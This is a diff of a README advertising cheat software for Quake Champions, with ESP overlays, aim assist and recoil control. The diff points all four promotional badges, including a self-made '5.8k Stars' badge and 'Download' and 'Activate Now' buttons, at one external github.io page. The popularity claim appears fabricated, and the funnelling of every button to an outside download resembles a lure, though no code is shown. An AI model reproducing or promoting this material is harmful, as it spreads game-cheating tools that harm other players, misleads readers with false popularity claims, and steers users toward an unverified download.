@@ -2,10 +2,10 @@
 
 The **Quake Champions Cheat Software** is designed for players who want enhanced awareness and sharper accuracy in fast-paced arenas. With real-time ESP overlays, configurable aim assist, and recoil stabilizers, it delivers the tools needed to **train, analyze, and push performance**.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.8k Stars](https://img.shields.io/badge/⭐️%205.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://quake-champions-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://quake-champions-cheat.github.io/.github/)
+[![⭐️ 5.8k Stars](https://img.shields.io/badge/⭐️%205.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://quake-champions-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://quake-champions-cheat.github.io/.github/)
 
 ---
 
